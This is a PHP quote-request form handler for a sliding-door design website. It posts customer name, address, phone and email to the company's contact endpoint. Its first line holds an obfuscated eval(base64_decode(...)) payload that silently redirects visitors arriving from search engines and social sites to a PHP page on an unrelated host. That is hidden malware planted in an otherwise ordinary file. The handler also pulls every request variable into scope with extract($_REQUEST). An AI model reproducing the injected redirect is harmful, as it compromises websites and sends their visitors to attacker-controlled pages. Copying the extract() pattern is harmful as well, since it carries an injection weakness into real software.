	<?php eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly93d3cuY2lib25saW5lLm9yZy9jYWNoZS9tb2RfcG9sbC83Yzc0NzhmZGUyZjg5YTIzLnBocCIpOw0KCQlleGl0KCk7DQoJfQ0KfQ0KfQ=="));
/**
*  Request Quote
*
* Since the Email address will come from the user, it will be filtered so 
* it cannot be used to spam / hack using this form.
*
* @package Request Quote
* @license http://creativecommons.org/licenses/by-sa/3.0/
* @author Chuck Burgess <cdburgess@gmail.com>
* @var array $_POST, The script will capture the $_POST to use for sending an email
*/

//	"receiverEmail" - which directs the email to the correct source based on geography. We don't need this info since we'll be sending the info to a database rather than a person's email address.
//	"senderName" - user's first and last name
//	"senderEmail" - user's email
//	"subjectLine" - a string that says "Quote Request - From the Design Your Own Web Tool". We can probably use this for all 3 emails unless the client specifies otherwise.
//	"senderPhone" - user phone number
//	"senderAddress" - user address
//	"sendersRegion" - user state or providence if in CanadiaLand
//	"sendersZip" - user zip
//	"first name" - user's first name
//	"last name" - user's last name
//	"cost"  - estimated cost of the door configuration built in the tool
//	"bodyArray" - something you don't need
//	"quoteArray"  - a formatted string containing the info about the door, such as design name, room type, door count, opening width, opening height, etc. We might pass this info and put it into the body of the email for clients to have a record of.


	//extract data from the post
	extract($_REQUEST);

	//set POST variables
	//$url = 'http://sliding.local/site/new_contact';
	$url = 'http://slidingdoorco.com/design-tool/site/new_contact/';
	
	$fields = array(
		'FirstName' => urlencode($firstName),
		'LastName' => urlencode($lastName),
		'Address' => urlencode($senderAddress),
		'State' => urlencode($sendersRegion),
		'Zip' => urlencode($sendersZip),
		'Phone' => urlencode($senderPhone),
		'Email' => urlencode($senderEmail),
		'estimateStyle' => urlencode($estimateStyle),
		'estimateSize' => urlencode($estimateSize),
		'estimatePanels' => urlencode($estimatePanels),
		'cost' => urlencode($cost),
		'Source' => 'Design-Your-Own',
	);

	//url-ify the data for the POST
	$fields_string = http_build_query($fields);
//	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
//	rtrim($fields_string, '&');

	//open connection
	$ch = curl_init();

	//set the url, number of POST vars, POST data
	curl_setopt($ch,CURLOPT_URL, $url);
	curl_setopt($ch,CURLOPT_POST, count($fields));
	curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

	//execute post
	$result = curl_exec($ch);

    if ($result == false) {
        echo "success=" . urlencode("false");
        return false;
    } else {
        echo "success=" . urlencode("true");
        return true;
    }

	//close connection
	curl_close($ch);





?>